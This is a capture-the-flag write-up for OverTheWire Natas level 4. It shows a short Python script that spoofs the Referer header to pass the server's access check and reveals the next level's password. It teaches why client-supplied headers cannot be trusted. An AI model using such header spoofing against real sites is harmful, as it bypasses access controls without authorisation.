# Natas Level 4

### Level Goal
> The goal of this level is to find the password for the next level.

### Discovery & Logic
1. **Analysis**: The page says *"Access disallowed. You are visiting from "" while authorized users should come only from `http://natas5.natas.labs.overthewire.org/`"*.
2. **Problem**: The server checks the `Referer` HTTP header to verify where the request is coming from. Browsers send this header automatically, but we can manipulate it manually.
3. **Solution**: Send a GET request with the `Referer` header set to `http://natas5.natas.labs.overthewire.org/` using a Python script.

### Source Code
[natas04.py](natas04.py)

### Commands Used

```python
import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer = "http://natas5.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = ("natas4", "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ")
s.headers.update({"referer": referer})
r = s.get(url)

print(r.text)
```

### What I Learned
* **Referer Header**: The `Referer` HTTP header tells the server which page the user came from. It is sent by the browser automatically but can be freely spoofed by anyone using tools like `curl`, `requests`, or browser devtools.
* **Never Trust Client-Side Headers**: Using the `Referer` header as an authentication/authorization mechanism is insecure — any client can set it to any value.

### Password Found
<details>
  <summary>Click to reveal password</summary>
  <code>0n35PkggAPm2zbEpOU802c0x0Msn1ToK</code>
</details>
